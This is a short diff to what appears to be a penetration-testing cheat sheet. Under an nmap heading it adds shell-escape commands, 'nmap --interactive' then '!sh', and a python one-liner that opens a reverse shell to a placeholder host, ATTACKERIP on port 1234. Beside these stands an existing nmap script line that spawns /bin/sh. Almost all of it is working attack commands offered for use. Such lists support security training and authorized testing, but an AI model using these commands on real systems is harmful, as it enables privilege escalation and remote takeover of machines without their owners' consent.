@@ -361,6 +361,13 @@ And in case you would like to use a command that itself takes flags or different
 ##### nmap
 
 ```
+nmap --interactive
+!sh
+```
+
+or
+
+```
 nmap --script <(echo 'require "os".execute "/bin/sh"')
 ```
 
@@ -368,6 +375,7 @@ or
 
 ```
 nmap --interactive
+!python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKERIP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 or
